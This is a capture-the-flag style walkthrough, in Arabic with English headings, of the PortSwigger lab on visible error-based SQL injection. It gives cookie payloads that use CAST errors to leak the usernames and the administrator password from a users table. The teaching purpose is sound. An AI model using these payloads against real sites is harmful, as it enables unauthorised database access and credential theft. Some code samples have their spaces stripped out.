# Lab: Visible error-based SQL injection

https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

# 🧠 الفكرة الأساسية

الاستعلام الأصلي غالبًا كده:

```
SELECT*FROM trackingWHERE id='TrackingId'
```

إنت بتتحكم في قيمة:

```
TrackingId
```

# 1️⃣ إثبات وجود SQL Injection

## payload:

```
TrackingId=ogAZZfxtOKUELbuJ'
```

## الناتج:

بيطلع error:

```
Unterminated string literal
```

## ليه؟

لأن الكويري بقت كده:

```
SELECT*FROM trackingWHERE id='ogAZZfxtOKUELbuJ''
```

فيه quote زيادة → syntax error

✔️ إذًا التطبيق vulnerable.

# 2️⃣ إصلاح الكويري باستخدام comment

## payload:

```
TrackingId=ogAZZfxtOKUELbuJ'--
```

## الفكرة:

- `-` بتلغي باقي السطر.

الكويري تبقى:

```
SELECT*FROM trackingWHERE id='ogAZZfxtOKUELbuJ'--'
```

فالـ quote الأخيرة اتعمل لها comment.

✔️ الكويري بقت valid.

# 3️⃣ اختبار Subquery

## payload:

```
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

## المشكلة:

بيرجع error:

```
ANDcondition must beboolean
```

## ليه؟

لأن:

```
ANDCAST((SELECT1)ASint)
```

ده رقم، مش true/false.

# 4️⃣ تحويلها لشرط منطقي

## payload:

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

## ليه شغال؟

لأن:

```
1=1
```

ده boolean expression صح.

✔️ الكويري valid.

# 5️⃣ استخراج usernames

## payload:

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

## الفكرة العبقرية هنا 😈

إنت بتحاول تعمل:

```
CAST("administrator"ASint)
```

وده مستحيل.

فالـ database ترجع error زي:

```
invalidinput syntaxfor typeinteger:"administrator"
```

🔥 وهنا البيانات اتسربت في رسالة الخطأ.

# 6️⃣ مشكلة character limit

عشان الـ payload طويل، الـ comment `--` ممكن يتم قطعه.

## الحل:

شيل القيمة الأصلية كلها.

بدل:

```
TrackingId=ogAZZfxtOKUELbuJ
```

خلي:

```
TrackingId='
```

# 7️⃣ مشكلة multiple rows

## payload:

```
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

## المشكلة:

جدول users فيه أكثر من صف.

## الحل:

```
LIMIT1
```

# 8️⃣ استخراج أول username

## payload النهائي:

```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

## الخطأ:

```
ERROR: invalidinput syntaxfor typeinteger:"administrator"
```

🔥 عرفنا أول يوزر.

# 9️⃣ استخراج الباسورد

بما إن أول user هو administrator:

## payload:

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

## النتيجة:

database هترجع:

```
ERROR: invalidinput syntaxfor typeinteger:"PASSWORD_HERE"
```
